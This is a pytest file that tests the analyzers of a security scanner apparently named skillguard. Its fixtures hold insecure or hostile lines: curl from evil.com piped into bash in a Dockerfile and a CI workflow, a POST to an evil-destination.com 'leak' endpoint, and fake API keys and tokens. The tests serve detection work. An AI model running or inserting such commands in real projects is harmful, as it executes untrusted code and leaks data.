from pathlib import Path
import pytest

from skillguard.analyzers.dependency_analyzer import DependencyAnalyzer
from skillguard.analyzers.dockerfile_analyzer import DockerfileAnalyzer
from skillguard.analyzers.github_actions_analyzer import GithubActionsAnalyzer
from skillguard.analyzers.secret_analyzer import SecretAnalyzer
from skillguard.analyzers.network_destination_analyzer import NetworkDestinationAnalyzer

def test_dependency_analyzer(tmp_path: Path):
    # Setup mock requirements.txt
    req_file = tmp_path / "requirements.txt"
    req_content = """
requests==2.28.1
requestss==1.0.0
pycurl>=7.45.0
requests>=2.0.0
    """
    req_file.write_text(req_content, encoding="utf-8")

    analyzer = DependencyAnalyzer()
    findings = analyzer.analyze(tmp_path)

    # Expected:
    # 1. Typosquat: requestss (DEP001)
    # 2. Duplicate: requests (DEP002)
    # 3. Excessive permission: pycurl (DEP003)
    assert len(findings) == 3
    ids = {f.id for f in findings}
    assert "DEP001" in ids
    assert "DEP002" in ids
    assert "DEP003" in ids

def test_dependency_package_json(tmp_path: Path):
    # Setup mock package.json
    pkg_file = tmp_path / "package.json"
    pkg_content = """{
        "dependencies": {
            "lodash": "^4.17.21",
            "pycurl": "1.0.0"
        },
        "devDependencies": {
            "lodash": "^4.17.21"
        }
    }"""
    pkg_file.write_text(pkg_content, encoding="utf-8")

    analyzer = DependencyAnalyzer()
    findings = analyzer.analyze(tmp_path)

    # Expected:
    # 1. Duplicate lodash (DEP002)
    # 2. Excessive permission pycurl (DEP003)
    assert len(findings) == 2
    ids = {f.id for f in findings}
    assert "DEP002" in ids
    assert "DEP003" in ids

def test_dockerfile_analyzer(tmp_path: Path):
    # Setup mock Dockerfile
    docker_file = tmp_path / "Dockerfile"
    docker_content = """
FROM python:3.12
USER root
RUN curl -sSL https://evil.com/install.sh | bash
RUN chmod 777 /app/static
    """
    docker_file.write_text(docker_content, encoding="utf-8")

    analyzer = DockerfileAnalyzer()
    findings = analyzer.analyze(tmp_path)

    # Expected:
    # 1. USER root (DKR001)
    # 2. curl piped to bash (DKR003)
    # 3. chmod 777 (DKR005)
    assert len(findings) == 3
    ids = {f.id for f in findings}
    assert "DKR001" in ids
    assert "DKR003" in ids
    assert "DKR005" in ids

def test_github_actions_analyzer(tmp_path: Path):
    # Setup mock actions workflow
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    wf_file = wf_dir / "ci.yml"
    wf_content = """
name: Test CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl https://evil.com/install.sh | bash
      - name: Hardcode token
        env:
          GITHUB_TOKEN: ghp_123456789012345678901234567890123456
    """
    wf_file.write_text(wf_content, encoding="utf-8")

    analyzer = GithubActionsAnalyzer()
    findings = analyzer.analyze(tmp_path)

    # Expected:
    # 1. Remote script execution: curl | bash (GHA001)
    # 2. Unpinned commit SHA: actions/checkout@v4 (GHA002)
    # 3. Hardcoded secret: GITHUB_TOKEN ghp_... (GHA003)
    assert len(findings) == 3
    ids = {f.id for f in findings}
    assert "GHA001" in ids
    assert "GHA002" in ids
    assert "GHA003" in ids

def test_secret_analyzer(tmp_path: Path):
    # Setup mock env file
    env_file = tmp_path / ".env"
    env_content = """
OPENAI_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890ABCD
AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF
DB_PASSWORD="super_secret_password"
    """
    env_file.write_text(env_content, encoding="utf-8")

    analyzer = SecretAnalyzer()
    findings = analyzer.analyze(tmp_path)

    # Expected:
    # 1. OpenAI key (SEC101)
    # 2. AWS key (SEC101)
    # 3. Secret assignment (SEC101)
    assert len(findings) == 3
    for f in findings:
        assert f.id == "SEC101"
        assert f.severity == "CRITICAL"

def test_network_destination_analyzer(tmp_path: Path):
    # Setup mock python script calling external APIs
    py_file = tmp_path / "script.py"
    py_content = """
import requests
import urllib.request
requests.post("https://evil-destination.com/api/leak")
urllib.request.urlopen("http://api.github.com/users")
    """
    py_file.write_text(py_content, encoding="utf-8")

    analyzer = NetworkDestinationAnalyzer()
    findings = analyzer.analyze(tmp_path)

    # Expected:
    # 1. External Destination: evil-destination.com (NET201)
    # 2. External Destination: api.github.com (NET201)
    assert len(findings) == 2
    for f in findings:
        assert f.id == "NET201"
        assert f.severity == "LOW"
    
    domains = {f.message.split(": ")[1] for f in findings}
    assert "evil-destination.com" in domains
    assert "api.github.com" in domains
